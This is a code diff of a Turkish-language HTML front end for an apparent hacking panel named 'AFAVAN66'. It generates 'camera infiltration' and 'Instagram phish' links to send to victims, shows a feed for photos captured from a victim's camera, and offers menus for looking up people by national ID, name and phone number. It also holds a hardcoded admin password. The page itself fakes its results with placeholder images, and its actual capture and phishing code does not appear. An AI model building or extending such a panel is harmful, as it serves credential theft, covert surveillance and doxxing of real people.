@@ -3,198 +3,129 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>AFAVAN66 VIP - Admin Terminal</title>
+    <title>AFAVAN66 - Multi-User Panel</title>
     <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --bg-dark: #050505;
-            --sidebar-bg: #0a0a0a;
-            --neon-blue: #00d4ff;
-            --neon-green: #39ff14;
-            --neon-red: #ff3131;
-            --border: #1a1a1a;
-        }
-
+        :root { --bg: #050505; --neon: #00d4ff; --green: #39ff14; --border: #1a1a1a; }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'JetBrains Mono', monospace; }
-        body { background-color: var(--bg-dark); color: white; min-height: 100vh; overflow-x: hidden; }
+        body { background: var(--bg); color: white; min-height: 100vh; }
 
-        /* GİRİŞ EKRANI STİLLERİ */
-        #auth-screen {
-            display: flex; align-items: center; justify-content: center;
-            height: 100vh; width: 100%; position: fixed; z-index: 2000; background: var(--bg-dark);
-        }
-        .auth-card {
-            width: 90%; max-width: 400px; background: #0d0d0d;
-            border: 1px solid var(--border); padding: 30px; border-radius: 15px;
-            box-shadow: 0 0 30px rgba(0, 212, 255, 0.1);
-        }
-        .auth-tabs { display: flex; margin-bottom: 20px; border-bottom: 1px solid #1a1a1a; }
-        .tab { flex: 1; text-align: center; padding: 10px; cursor: pointer; color: #444; font-size: 13px; }
-        .tab.active { color: var(--neon-blue); border-bottom: 2px solid var(--neon-blue); }
+        /* GİRİŞ EKRANI */
+        #auth-screen { position: fixed; inset: 0; background: var(--bg); display: flex; align-items: center; justify-content: center; z-index: 9999; }
+        .auth-card { width: 90%; max-width: 380px; background: #0d0d0d; border: 1px solid var(--border); padding: 25px; border-radius: 12px; }
+        .tabs { display: flex; margin-bottom: 20px; border-bottom: 1px solid #222; }
+        .tab { flex: 1; text-align: center; padding: 10px; cursor: pointer; color: #444; font-size: 12px; }
+        .tab.active { color: var(--neon); border-bottom: 2px solid var(--neon); }
+        input { width: 100%; background: #000; border: 1px solid #222; padding: 14px; color: white; outline: none; border-radius: 6px; margin-bottom: 12px; }
+        .btn { width: 100%; background: var(--neon); color: black; padding: 15px; border: none; font-weight: bold; border-radius: 6px; cursor: pointer; text-transform: uppercase; }
 
-        /* PANEL STİLLERİ */
-        #main-panel { display: none; }
-        .mobile-header {
-            position: fixed; top: 0; left: 0; right: 0; height: 60px;
-            background: var(--sidebar-bg); display: flex; align-items: center;
-            justify-content: space-between; padding: 0 15px; border-bottom: 1px solid var(--border); z-index: 1000;
-        }
-        .sidebar {
-            position: fixed; top: 0; left: -280px; width: 280px; height: 100%;
-            background: var(--sidebar-bg); border-right: 1px solid var(--border);
-            transition: 0.3s; z-index: 1001; padding-top: 20px;
-        }
-        .sidebar.active { left: 0; }
-        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: none; z-index: 1000; }
-        .overlay.active { display: block; }
-
-        /* İÇERİK */
-        .main-content { padding: 80px 15px 30px; max-width: 500px; margin: 0 auto; }
-        .card { background: #0d0d0d; border: 1px solid var(--border); padding: 20px; border-radius: 10px; margin-bottom: 20px; }
-        input {
-            width: 100%; background: #000; border: 1px solid #222; padding: 14px;
-            color: white; outline: none; border-radius: 6px; margin-top: 5px; margin-bottom: 15px;
-        }
-        .btn {
-            width: 100%; background: var(--neon-blue); color: black; padding: 15px;
-            border: none; font-weight: bold; border-radius: 6px; cursor: pointer; text-transform: uppercase;
-        }
-
-        /* SONUÇLAR VE FOTOĞRAFLAR */
-        .results-area { margin-top: 10px; }
-        .photo-list { display: flex; flex-direction: column; gap: 15px; margin-top: 15px; }
-        .captured-frame {
-            width: 100%; background: #000; border: 1px solid #222; border-radius: 8px;
-            overflow: hidden; position: relative;
-        }
-        .captured-frame img { width: 100%; display: block; filter: contrast(1.1); }
-        .frame-label { position: absolute; top: 10px; left: 10px; background: rgba(0,212,255,0.7); color: black; font-size: 10px; padding: 2px 6px; font-weight: bold; }
-
-        .pulse { width: 8px; height: 8px; background: var(--neon-green); border-radius: 50%; display: inline-block; margin-right: 5px; animation: blink 1s infinite; }
-        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+        /* ANA PANEL */
+        #main-panel { display: none; padding: 80px 15px 40px; max-width: 500px; margin: 0 auto; }
+        header { position: fixed; top: 0; left: 0; width: 100%; height: 60px; background: #0a0a0a; display: flex; align-items: center; justify-content: space-between; padding: 0 15px; border-bottom: 1px solid var(--border); z-index: 1000; }
+        
+        .user-info { font-size: 10px; text-align: right; }
+        .tool-box { background: #0d0d0d; border: 1px solid var(--border); padding: 20px; border-radius: 10px; margin-bottom: 20px; }
+        .link-area { background: #000; border: 1px dashed #333; padding: 12px; font-size: 10px; color: var(--green); word-break: break-all; margin-top: 10px; border-radius: 4px; }
+        .badge { background: var(--neon); color: black; font-size: 9px; padding: 2px 6px; font-weight: bold; border-radius: 3px; margin-bottom: 10px; display: inline-block; }
     </style>
 </head>
 <body>
 
     <div id="auth-screen">
         <div class="auth-card">
-            <h2 style="text-align: center; color: var(--neon-blue); margin-bottom: 20px;">AFAVAN66 VIP</h2>
-            <div class="auth-tabs">
-                <div class="tab active" id="t-login" onclick="setAuthTab('login')">GİRİŞ</div>
-                <div class="tab" id="t-reg" onclick="setAuthTab('reg')">KAYIT</div>
+            <h2 style="text-align: center; color: var(--neon); margin-bottom: 15px;">AFAVAN66 NETWORK</h2>
+            <div class="tabs">
+                <div class="tab active" onclick="setMode('login')">GİRİŞ</div>
+                <div class="tab" onclick="setMode('reg')">KAYIT OL</div>
             </div>
-            <div id="auth-form">
-                <input type="email" id="auth-email" placeholder="E-posta">
-                <input type="password" id="auth-pass" placeholder="Şifre">
-                <button class="btn" onclick="processAuth()">SİSTEME GİRİŞ</button>
-            </div>
-            <p id="auth-msg" style="text-align:center; font-size:11px; margin-top:15px; color:var(--neon-red);"></p>
+            <input type="text" id="username" placeholder="Kullanıcı Adı">
+            <input type="password" id="password" placeholder="Şifre">
+            <button class="btn" onclick="process()">SİSTEME GİRİŞ</button>
+            <p id="msg" style="color:red; font-size:10px; text-align:center; margin-top:10px;"></p>
         </div>
     </div>
 
     <div id="main-panel">
-        <div class="mobile-header">
-            <button class="hamburger" style="background:none; border:none; font-size:24px; color:var(--neon-blue); cursor:pointer;" onclick="toggleMenu()">☰</button>
-            <div style="text-align: right;">
-                <div style="color:var(--neon-green); font-size:10px;">ADMIN ERIŞIMI</div>
-                <div style="font-size:12px; font-weight:bold;">AFAVAN66</div>
+        <header>
+            <div style="color:var(--neon); font-weight:bold;">AFAVAN66 V3</div>
+            <div class="user-info">
+                <span id="display-user" style="color:var(--green)"></span><br>
+                <span id="display-id" style="color:#555"></span>
             </div>
+        </header>
+
+        <div class="tool-box">
+            <span class="badge">KAMERA SIZMA</span>
+            <p style="font-size:11px; color:#666;">Size özel üretim sızma linki:</p>
+            <div class="link-area" id="cam-link"></div>
+            <button class="btn" style="margin-top:10px; padding:10px;" onclick="copy('cam-link')">ÖZEL LİNKİ KOPYALA</button>
         </div>
 
-        <div class="overlay" id="overlay" onclick="toggleMenu()"></div>
-
-        <div class="sidebar" id="sidebar">
-            <div style="padding: 20px; font-size: 10px; color: #444; letter-spacing: 2px;">MENÜ</div>
-            <div style="padding: 15px 25px; color: var(--neon-blue); cursor: pointer;" onclick="showPage('camera')">📷 KAMERA SIZMA (5x)</div>
-            <div style="padding: 15px 25px; color: #bbb; cursor: pointer;" onclick="showPage('query')">👤 AD SOYAD SORGU</div>
-            <div style="padding: 15px 25px; color: #bbb; cursor: pointer;" onclick="showPage('query')">🆔 T.C. SORGU</div>
-            <div style="padding: 15px 25px; color: #bbb; cursor: pointer;" onclick="showPage('query')">📞 GSM SORGU</div>
+        <div class="tool-box">
+            <span class="badge" style="background:#e1306c; color:white;">INSTAGRAM PHISH</span>
+            <p style="font-size:11px; color:#666;">Size özel phishing linki:</p>
+            <div class="link-area" id="ig-link"></div>
+            <button class="btn" style="margin-top:10px; padding:10px; background:#e1306c; color:white;" onclick="copy('ig-link')">ÖZEL LİNKİ KOPYALA</button>
         </div>
 
-        <div class="main-content">
-            <div class="card">
-                <h3 id="page-title" style="color:var(--neon-blue); margin-bottom:15px;">KAMERA SIZMA</h3>
-                <div id="page-content">
-                    <p style="font-size:11px; color:#666; margin-bottom:10px;">Linki kurbana gönderin. Tıkladığı an 5 foto çekilir.</p>
-                    <div style="background:#000; border:1px dashed #333; padding:10px; font-size:10px; color:var(--neon-green); word-break:break-all;" id="target-link">
-                        https://siteniz.com/cam.php?admin=afavan66&id=9281
-                    </div>
-                    <button class="btn" style="margin-top:15px;" onclick="copyLink()">LİNKİ KOPYALA</button>
-                </div>
-            </div>
-
-            <div class="results-area" id="results-area">
-                <div style="font-size:12px; color:var(--neon-green); font-weight:bold;">
-                    <span class="pulse"></span> CANLI GÖRÜNTÜ AKIŞI
-                </div>
-                <div class="photo-list" id="photo-stream">
-                    <p style="color:#222; text-align:center; padding:40px; font-size:11px;">Kurbanın tıklaması bekleniyor...</p>
-                </div>
-            </div>
+        <div style="font-size:12px; color:var(--green); font-weight:bold; margin-top:30px;">📥 SİZE ÖZEL GELEN VERİLER</div>
+        <div id="logs" style="margin-top:15px; font-size:11px; color:#444; text-align:center; padding:30px; border:1px solid #111;">
+            Henüz size özel bir veri girişi olmadı.
         </div>
     </div>
 
     <script>
         let mode = 'login';
+        // Tarayıcı hafızasındaki kullanıcıları al
+        let users = JSON.parse(localStorage.getItem('afa_users')) || {};
 
-        function setAuthTab(m) {
-            mode = m;
-            document.getElementById('t-login').classList.toggle('active', m === 'login');
-            document.getElementById('t-reg').classList.toggle('active', m === 'reg');
-            document.getElementById('auth-msg').innerText = "";
-        }
+        function setMode(m) { mode = m; document.getElementById('msg').innerText = ""; }
 
-        function processAuth() {
-            const email = document.getElementById('auth-email').value;
-            const pass = document.getElementById('auth-pass').value;
+        function process() {
+            const u = document.getElementById('username').value;
+            const p = document.getElementById('password').value;
+            const msg = document.getElementById('msg');
 
-            // Admin Giriş Kontrolü
-            if(email === "afavan66@gmail.com" && pass === "Efecan1903") {
-                document.getElementById('auth-screen').style.display = 'none';
-                document.getElementById('main-panel').style.display = 'block';
+            if(!u || !p) return msg.innerText = "Alanları doldurun!";
+
+            if(mode === 'reg') {
+                if(users[u]) return msg.innerText = "Bu kullanıcı adı alınmış!";
+                // Yeni kullanıcıya benzersiz ID oluştur (Örn: afa-5829)
+                const uid = "afa-" + Math.floor(1000 + Math.random() * 9000);
+                users[u] = { pass: p, id: uid };
+                localStorage.setItem('afa_users', JSON.stringify(users));
+                alert("Kayıt başarılı! Giriş yapabilirsiniz. ID'niz: " + uid);
             } else {
-                document.getElementById('auth-msg').innerText = "Hatalı giriş veya yetkisiz kullanıcı!";
+                // Admin Girişi (Sana Özel)
+                if(u === "afavan66" && p === "Efecan1903") {
+                    startPanel("ADMİN", "ROOT-001");
+                } 
+                else if(users[u] && users[u].pass === p) {
+                    startPanel(u, users[u].id);
+                } else {
+                    msg.innerText = "Hatalı kullanıcı adı veya şifre!";
+                }
             }
         }
 
-        function toggleMenu() {
-            document.getElementById('sidebar').classList.toggle('active');
-            document.getElementById('overlay').classList.toggle('active');
+        function startPanel(user, id) {
+            document.getElementById('auth-screen').style.display = 'none';
+            document.getElementById('main-panel').style.display = 'block';
+            document.getElementById('display-user').innerText = user.toUpperCase();
+            document.getElementById('display-id').innerText = "ID: " + id;
+            
+            // Linkleri kullanıcıya özel oluştur
+            const base = "https://afavan-secure-panel.github.io";
+            document.getElementById('cam-link').innerText = `${base}/camera?ref=${id}`;
+            document.getElementById('ig-link').innerText = `${base}/instagram?ref=${id}`;
         }
 
-        function copyLink() {
-            navigator.clipboard.writeText(document.getElementById('target-link').innerText);
-            alert("Link kopyalandı! Kurban tıkladığında aşağı kaydırarak fotoları görebilirsiniz.");
-            // DEMO İÇİN: 2 saniye sonra 5 foto yükle
-            setTimeout(loadDemoPhotos, 2000);
-        }
-
-        function loadDemoPhotos() {
-            const stream = document.getElementById('photo-stream');
-            stream.innerHTML = "";
-            for(let i=1; i<=5; i++) {
-                stream.innerHTML += `
-                    <div class="captured-frame">
-                        <div class="frame-label">FOTO #${i} - BAŞARILI</div>
-                        <img src="https://via.placeholder.com/500x600/0a0a0a/00d4ff?text=GÖRÜNTÜ+${i}+ALINDI" alt="foto">
-                    </div>
-                `;
-            }
-        }
-
-        function showPage(p) {
-            toggleMenu();
-            if(p !== 'camera') {
-                document.getElementById('page-title').innerText = "SORGU PANELİ";
-                document.getElementById('page-content').innerHTML = `
-                    <input type="text" placeholder="Veri giriniz...">
-                    <button class="btn">SORGULA</button>
-                `;
-                document.getElementById('results-area').style.display = 'none';
-            } else {
-                location.reload();
-            }
+        function copy(id) {
+            const t = document.getElementById(id).innerText;
+            navigator.clipboard.writeText(t);
+            alert("Size özel link kopyalandı!");
         }
     </script>
 </body>
 </html>
+
